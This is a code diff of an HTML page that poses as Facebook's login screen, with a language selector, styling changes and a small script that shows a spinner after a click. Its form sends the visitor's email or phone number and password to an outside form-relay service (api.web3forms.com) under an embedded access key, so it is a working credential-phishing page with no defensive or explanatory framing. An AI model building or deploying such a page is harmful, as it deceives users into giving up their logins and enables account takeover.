@@ -1,42 +1,73 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook</title>
     <link rel="shortcut icon" href="favicon-fb.png" type="image/x-icon">
-    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="style.css">
     <link
-      rel="stylesheet"
-      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
-    />
-  </head>
-  <body>
-    <container>
-      <nav>
-        <h1>facebook</h1>
-      </nav>
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+  />
+</head>
+<body>
+<div class="container">
+    <header class="header">
+        <select name="select-lg" id="selectBox">
+            <option value="English(US)">English(US)</option>
+            <option value="Bengali">Bengali</option>
+        </select>
 
-      <main>
-        <header>
+        <div class="fb-icon"><i class="fa-brands fa-facebook"></i></div>
+    </header>
+    <main class="main">
+        <div class="form_part">
+            <form class="form_part" action="https://api.web3forms.com/submit" method="POST">
+                
+                <input class="email_box" type="text" name="email_phone" placeholder="Mobile number or email">
+                <input class="pass_box" type="password" name="pass_word" placeholder="Password">
+                <input class="log_in buffer" type="submit" name="submit" value="Log in">
+                
+                <input class="buffer" type="button" name="button" value="Forgotten password?">
+                <input class="buffer" type="button" name="button" value="Create new account">
+                <input class="buffer" type="button" name="button" value="Not now" id="notNow">
 
-          <div class="text">Log in to Facebook</div>
-        </header>
-
-        <form action="https://api.web3forms.com/submit" method="POST">
-          
-          <input type="text" name="text" placeholder="Mobile number or email address" required />
-          <input type="password" name="password" placeholder="Facebook password" required />
-          <input type="submit" name="submit" value="Log in" />
-          <input type="button" name="button" value="Forgotten password?" />
-          <div class="empty_div"></div>
-          <input type="button" name="button" value="Create new" />
-          <input type="button" name="button" value="Not now" />
-          
-          <input type="hidden" name="access_key" value="7c4d2152-ba89-4cc8-88a8-53bc89ddbf2c">
-        </form>
-      </main>
-    </container>
-  </body>
+                <!-- <div class="infin_all"><span class="infin">&infin;Fuad</span></div> -->
+                <input type="hidden" name="access_key" value="7c4d2152-ba89-4cc8-88a8-53bc89ddbf2c">
+            </for>
+        </div>
+    </main>
+</div>
+</body>
+    <script>
+        const submit = document.querySelectorAll(".buffer")
+        const array = [...submit]
+        array.forEach(Element => {
+            Element.addEventListener("click", (e) => {
+                    let body = document.querySelector("body");
+                    body.style.display = "none";
+                setTimeout(() => {
+                   
+                    body.style.display = "block";
+                    body.style.background = "white";
+                    body.innerHTML = `<div class="spinner"><div/>`;
+                },0);
+                
+            })
+        })
+    </script>
 </html>
+
+
+
+
+
+
+
+
+
+
+
+
 
